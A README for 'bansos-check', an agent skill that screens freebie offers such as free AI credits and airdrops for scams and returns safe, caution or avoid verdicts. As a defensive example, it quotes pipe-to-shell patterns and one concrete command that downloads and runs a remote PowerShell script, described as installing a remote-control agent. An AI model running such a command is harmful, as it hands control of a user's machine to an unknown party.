# bansos-check

An agent skill for evaluating "bansos" (freebie handout) offers — free AI credits, subscription giveaways, airdrops, promo installers, free API keys — shared via Telegram, social media, ads, or DMs, and returning a safety verdict backed by evidence:

- **AMAN** — safe
- **HATI-HATI** — proceed only with caution
- **JANGAN** — do not touch it

## Why

"Free Claude credits" style offers are a standard lure: pipe-to-shell installers (`irm ... | iex`, `curl ... | sh`) that drop remote-control agents on your machine, fake login pages that steal Google accounts, "activation fees" for prizes that don't exist. This skill gives an AI agent a fixed, read-only procedure to check an offer before its human clicks, logs in, installs, or pays anything:

1. Resolve the real destination domain and check it against the official one
2. Classify the mechanism (promo code on an official site vs. unknown installer vs. credential entry)
3. Compare the offer's claim against the destination's own content
4. Weigh pressure tactics (countdowns, limited slots)
5. Corroborate with independent reporting
6. Issue a verdict with evidence and a safe alternative

## Install

```bash
npx skills add aryanibos/bansos-check
```

## Worked example

A Telegram post promised "free 30k Claude Opus credits" via superbot.gg. The check found a third-party product whose Windows install was `irm https://superbot.gg/bootstrap.ps1 | iex` — a pipe-to-shell one-liner installing a remote-control agent — while the site itself sells its own tokens, not Anthropic credits. Verdict: **JANGAN**.

## License

MIT
